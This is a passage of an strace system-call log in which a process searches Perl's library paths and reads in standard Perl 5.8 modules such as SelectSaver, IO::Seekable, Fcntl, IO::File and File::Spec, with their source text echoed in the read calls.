$stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
10195 07:31:50.925485 read(8,  <unfinished ...>
10193 07:31:50.925504 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.925526 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10193 07:31:50.925541 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.925552 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10193 07:31:50.925564 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10193 07:31:50.925578 waitpid(-1,  <unfinished ...>
10195 07:31:50.925588 <... read resumed> "", 4096) = 0
10195 07:31:50.925595 close(8)          = 0
10195 07:31:50.925658 stat64("/etc/perl/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925675 stat64("/etc/perl/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925689 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925702 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925716 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925733 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925747 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925759 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925773 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925785 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925813 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925857 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.925887 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.925901 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
10195 07:31:50.925923 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.925938 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.925951 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.925983 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
10195 07:31:50.926107 brk(0x81d6000)    = 0x81d6000
10195 07:31:50.926138 read(8, "", 4096) = 0
10195 07:31:50.926150 close(8)          = 0
10195 07:31:50.926617 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
10195 07:31:50.927267 read(6, "", 4096) = 0
10195 07:31:50.927284 close(6)          = 0
10195 07:31:50.927363 stat64("/etc/perl/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927394 stat64("/etc/perl/IO/Seekable.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927409 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927422 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927436 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927449 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927463 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927475 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927488 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927500 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927513 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.927526 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
10195 07:31:50.927548 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.927563 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.927574 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.927593 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
10195 07:31:50.927724 stat64("/etc/perl/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927739 stat64("/etc/perl/Fcntl.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.927752 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927765 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.927778 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927806 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.927851 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927864 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.927893 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927921 stat64("/usr/share/perl5/Fcntl.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.927934 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.927947 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
10195 07:31:50.927967 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.927981 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.927993 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.928011 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
10195 07:31:50.928405 brk(0x81f7000)    = 0x81f7000
10195 07:31:50.928592 read(8, "", 4096) = 0
10195 07:31:50.928607 close(8)          = 0
10195 07:31:50.928675 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10195 07:31:50.934112 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10195 07:31:50.934112 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
10195 07:31:50.934112 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
10195 07:31:50.934113 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10195 07:31:50.934113 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d37000
10195 07:31:50.934119 mmap2(0xb7d3a000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d3a000
10195 07:31:50.934135 close(8)          = 0
10195 07:31:50.934405 read(6, "", 4096) = 0
10195 07:31:50.943906 close(6)          = 0
10195 07:31:50.943947 stat64("/etc/perl/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.943963 stat64("/etc/perl/IO/File.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.943977 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.943989 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944003 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.944016 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944034 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.944046 stat64("/usr/lib/perl5/IO/File.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944059 stat64("/usr/share/perl5/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.944071 stat64("/usr/share/perl5/IO/File.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944084 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.944097 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
10195 07:31:50.944118 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.944133 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.944144 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.944162 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
10195 07:31:50.944480 stat64("/etc/perl/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944497 stat64("/etc/perl/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944510 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944523 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944537 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944550 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944564 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944576 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944589 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944601 stat64("/usr/share/perl5/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944618 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944631 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944645 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.944658 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
10195 07:31:50.944679 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.944693 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.944705 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.944722 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
10195 07:31:50.944796 stat64("/etc/perl/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944822 stat64("/etc/perl/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944863 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944875 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944906 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.944919 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
